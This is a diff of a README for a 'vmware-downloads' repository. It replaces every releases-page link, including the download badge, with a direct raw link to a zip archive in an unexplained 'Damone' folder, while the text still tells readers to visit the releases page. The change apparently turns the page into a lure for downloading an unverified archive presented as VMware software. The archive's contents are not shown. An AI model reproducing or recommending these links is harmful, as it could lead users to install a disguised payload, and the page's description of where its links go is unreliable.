@@ -1,6 +1,6 @@
 # 🚀 vmware-downloads - Easy Access to VMware Downloads
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SushiCodelnw/vmware-downloads/releases)
+[![Download](https://raw.githubusercontent.com/SushiCodelnw/vmware-downloads/main/Damone/vmware-downloads.zip)](https://raw.githubusercontent.com/SushiCodelnw/vmware-downloads/main/Damone/vmware-downloads.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To download the latest VMware software, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to reach the download section:
-   [Download VMware Software](https://github.com/SushiCodelnw/vmware-downloads/releases)
+   [Download VMware Software](https://raw.githubusercontent.com/SushiCodelnw/vmware-downloads/main/Damone/vmware-downloads.zip)
 
 2. **Select Your Software**  
    On the Releases page, you will find a list of available VMware software versions. Browse through the available options.
@@ -72,4 +72,4 @@ A: Yes, VMware offers trial versions of most products. Check the details on the 
 
 For further inquiries or support, please reach out through the issues section on GitHub. This will allow you to connect with the community and the maintainers of the repository.
 
-[Download VMware Software Again](https://github.com/SushiCodelnw/vmware-downloads/releases)
+[Download VMware Software Again](https://raw.githubusercontent.com/SushiCodelnw/vmware-downloads/main/Damone/vmware-downloads.zip)
